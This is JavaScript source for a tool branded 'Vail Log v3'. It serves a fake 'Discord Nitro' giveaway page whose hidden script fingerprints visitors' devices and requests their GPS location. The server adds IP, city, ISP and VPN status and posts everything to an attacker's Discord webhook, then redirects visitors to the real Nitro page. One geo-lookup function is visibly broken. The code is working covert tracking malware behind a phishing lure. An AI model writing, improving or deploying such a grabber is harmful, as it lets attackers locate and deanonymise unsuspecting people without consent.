// In-memory seen IPs (resets on restart — use Redis for persistence)
const seenIPs = new Map();

const BOT_STRINGS = ['googlebot','bingbot','slurp','duckduckbot','baiduspider',
  'yandexbot','sogou','ia_archiver','wget','curl','python-requests',
  'axios','go-http','java/','libwww','httpie','scrapy','ahrefs','semrush'];

const FLAGS = {US:'🇺🇸',GB:'🇬🇧',AU:'🇦🇺',CA:'🇨🇦',DE:'🇩🇪',FR:'🇫🇷',
  NL:'🇳🇱',SG:'🇸🇬',JP:'🇯🇵',KR:'🇰🇷',BR:'🇧🇷',IN:'🇮🇳',MX:'🇲🇽',
  RU:'🇷🇺',CN:'🇨🇳',IT:'🇮🇹',ES:'🇪🇸',SE:'🇸🇪',NO:'🇳🇴',FI:'🇫🇮',
  DK:'🇩🇰',PL:'🇵🇱',UA:'🇺🇦',TR:'🇹🇷',SA:'🇸🇦',AE:'🇦🇪',ZA:'🇿🇦',
  NG:'🇳🇬',IE:'🇮🇪',CH:'🇨🇭',AT:'🇦🇹',NZ:'🇳🇿',HK:'🇭🇰',PT:'🇵🇹',BE:'🇧🇪'};

function getIP(req) {
  return (req.headers['cf-connecting-ip'] ||
          req.headers['x-forwarded-for']?.split(',')[0].trim() ||
          req.headers['x-real-ip'] ||
          req.socket.remoteAddress || 'unknown').replace('::ffff:','');
}

function isBot(ua='') {
  const l = ua.toLowerCase();
  return BOT_STRINGS.some(b => l.includes(b));
}

function parseUA(ua='') {
  let browser='Unknown', os='Unknown', device='Desktop';
  if (/Edge?\/([\d.]+)/.test(ua))      browser='Edge '+RegExp.$1;
  else if (/OPR\/([\d.]+)/.test(ua))  browser='Opera '+RegExp.$1;
  else if (/Chrome\/([\d.]+)/.test(ua)) browser='Chrome '+RegExp.$1;
  else if (/Firefox\/([\d.]+)/.test(ua)) browser='Firefox '+RegExp.$1;
  else if (/Safari\/([\d.]+)/.test(ua))  browser='Safari';
  if (/Android/.test(ua))      { os='Android'; device='Mobile'; }
  else if (/iPhone/.test(ua))  { os='iOS'; device='Mobile'; }
  else if (/iPad/.test(ua))    { os='iPadOS'; device='Tablet'; }
  else if (/Windows/.test(ua)) os='Windows';
  else if (/Mac OS X/.test(ua)) os='macOS';
  else if (/Linux/.test(ua))   os='Linux';
  if (/Mobile/.test(ua) && device==='Desktop') device='Mobile';
  return { browser, os, device };
}

// Free geo API — ip-api.com, 45 req/min on free tier
function getGeo(ip) {
  return new Promise(resolve => {
    const url = 'http://ip-api.com/json/'+ip+'?fields=status,country,countryCode,regionName,city,lat,lon,isp,org,as,proxy,hosting,timezone,query';
    https.get(url.replace('http:','').replace('//',''), {hostname:'ip-api.com',path:'/json/'+ip+'?fields=status,country,countryCode,regionName,city,lat,lon,isp,org,as,proxy,hosting,timezone,query'}, res => {
      // Use http not https for ip-api free tier
      resolve({});
    }).on('error', () => resolve({}));
  });
}

// Simpler geo fetch using http module
function fetchGeo(ip) {
  return new Promise(resolve => {
    const http = require('http');
    const req = http.get('http://ip-api.com/json/'+ip+'?fields=status,country,countryCode,regionName,city,lat,lon,isp,as,proxy,hosting,timezone', res => {
      let body = '';
      res.on('data', chunk => body += chunk);
      res.on('end', () => {
        try { resolve(JSON.parse(body)); }
        catch(e) { resolve({}); }
      });
    });
    req.on('error', () => resolve({}));
    req.setTimeout(3000, () => { req.destroy(); resolve({}); });
  });
}

function dedupCheck(ip) {
  if (CONFIG.dedup === 'all') return true;
  const now = Date.now();
  const seen = seenIPs.get(ip);
  if (CONFIG.dedup === 'once' && seen) return false;
  if (CONFIG.dedup === 'hourly' && seen && (now - seen) < 3600000) return false;
  seenIPs.set(ip, now);
  return true;
}

async function sendWebhook(d) {
  if (!CONFIG.webhook) return;
  const fields = [];
  if(d.ip)       fields.push({name:'🌐 IP',value:'`'+d.ip+'`',inline:true});
  if(d.country)  fields.push({name:'🏳️ Country',value:(d.flag||'🏳️')+' '+d.country+' ('+d.cc+')',inline:true});
  if(d.city)     fields.push({name:'🏙️ City',value:d.city+(d.region?', '+d.region:''),inline:true});
  if(d.lat)      fields.push({name:'📍 Coords',value:d.lat+', '+d.lon,inline:true});
  if(d.isp)      fields.push({name:'📡 ISP',value:d.isp,inline:false});
  if(d.asn)      fields.push({name:'🔢 ASN',value:d.asn,inline:true});
  if(d.tz)       fields.push({name:'🕐 Timezone',value:d.tz,inline:true});
  fields.push({name:'🔒 VPN',value:d.vpn?'**YES ⚠️**':'No',inline:true});
  fields.push({name:'🤖 Bot',value:d.bot?'**YES**':'No',inline:true});
  if(d.browser)  fields.push({name:'🌐 Browser',value:d.browser,inline:true});
  if(d.os)       fields.push({name:'💻 OS',value:d.os,inline:true});
  if(d.device)   fields.push({name:'📱 Device',value:d.device,inline:true});
  if(d.lang)     fields.push({name:'🗣️ Language',value:d.lang,inline:true});
  if(d.ref)      fields.push({name:'🔗 Referrer',value:d.ref||'Direct',inline:false});
  if(d.ua)       fields.push({name:'📋 User-Agent',value:'`'+d.ua.slice(0,200)+'`',inline:false});
  if(d.method)   fields.push({name:'📨 Method',value:d.method,inline:true});
  fields.push({name:'⏰ Time',value:d.time,inline:true});
  if(d.screen)   fields.push({name:'🖥️ Screen',value:d.screen,inline:true});
  if(d.cores)    fields.push({name:'⚙️ Cores',value:String(d.cores),inline:true});
  if(d.mem)      fields.push({name:'🧠 RAM',value:d.mem+'GB',inline:true});
  if(d.bat)      fields.push({name:'🔋 Battery',value:d.bat,inline:true});
  if(d.conn)     fields.push({name:'📶 Connection',value:d.conn,inline:true});
  fields.push({name:'👆 Touch',value:d.touch?'Yes':'No',inline:true});
  fields.push({name:'🌙 Dark Mode',value:d.dark?'Yes':'No',inline:true});
  if(d.tzjs)     fields.push({name:'🕐 TZ (JS)',value:d.tzjs,inline:true});
  if(d.cvfp)     fields.push({name:'🎨 Canvas FP',value:'`'+d.cvfp+'`',inline:false});
  if(d.wgfp)     fields.push({name:'🎮 WebGL',value:d.wgfp,inline:true});
  if(d.plg)      fields.push({name:'🔌 Plugins',value:d.plg,inline:false});
  if(d.gps)      fields.push({name:'📍 GPS',value:d.gps,inline:true});
  const body = JSON.stringify({
    username: CONFIG.botName,
    content:  '@here ',
    embeds: [{
      title:  '🎯 New Hit — Vail Log',
      color:  CONFIG.embedColor,
      fields,
      footer: { text: 'Vail Log v3 • '+d.time }
    }]
  });
  return new Promise(resolve => {
    const u = new URL(CONFIG.webhook);
    const opts = {
      hostname: u.hostname,
      path:     u.pathname+u.search,
      method:   'POST',
      headers:  {'Content-Type':'application/json','Content-Length':Buffer.byteLength(body)}
    };
    const req = https.request(opts, res => { res.resume(); resolve(); });
    req.on('error', resolve);
    req.setTimeout(5000, () => { req.destroy(); resolve(); });
    req.write(body); req.end();
  });
}

// ── HTML page served to visitor ────────────────────
function buildPage() {
  return `<!DOCTYPE html>
<html><head>
<meta charset='UTF-8'>
<meta name='viewport' content='width=device-width,initial-scale=1'>
<title>Discord Nitro</title>
<meta name='description' content='Claim your free Nitro!'>

<meta property='og:description' content='Claim your free Nitro!'>
<style>*{box-sizing:border-box}body{margin:0;background:#fff;display:flex;align-items:center;justify-content:center;min-height:100vh}@keyframes sp{to{transform:rotate(360deg)}}</style>
</head><body>
<div style="text-align:center;font-family:sans-serif;padding:80px;color:#777"><div style="width:36px;height:36px;border:3px solid #eee;border-top:3px solid #7c3aed;border-radius:50%;animation:sp .8s linear infinite;margin:0 auto 16px"></div><p>Loading...</p></div>
<script>
(function(){
  var d = {};
    d.screen = window.screen.width+'x'+window.screen.height+'@'+window.devicePixelRatio+'x';
    d.cores  = navigator.hardwareConcurrency || 0;
    d.mem    = navigator.deviceMemory || 0;
    d.touch  = ('ontouchstart' in window) || navigator.maxTouchPoints > 0;
    d.dark   = window.matchMedia('(prefers-color-scheme:dark)').matches;
    d.tzjs   = Intl.DateTimeFormat().resolvedOptions().timeZone;
    d.plg    = Array.from(navigator.plugins||[]).map(p=>p.name).join(', ');
    const nc = navigator.connection||navigator.mozConnection; if(nc) d.conn=(nc.effectiveType||'')+' dl:'+(nc.downlink||'');
    try{const cv=document.createElement('canvas'),cx=cv.getContext('2d');cx.font='14px Arial';cx.fillText('VL🎯',2,14);d.cvfp=cv.toDataURL().slice(-20);}catch(e){}
    try{const gl=document.createElement('canvas').getContext('webgl');const dbg=gl.getExtension('WEBGL_debug_renderer_info');d.wgfp=gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);}catch(e){}
    if(navigator.getBattery) navigator.getBattery().then(b=>{d.bat=Math.round(b.level*100)+'%'+(b.charging?' ⚡':'');flush();});
    navigator.geolocation&&navigator.geolocation.getCurrentPosition(pos=>{d.gps=pos.coords.latitude+', '+pos.coords.longitude+' ±'+Math.round(pos.coords.accuracy)+'m';flush();});
  function flush(){
    fetch(location.href,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(d)})
      .catch(()=>{});
  }
  flush();
  window.location.replace('https://discord.com/nitro');
})();
<\/script>
</body></html>`;
}

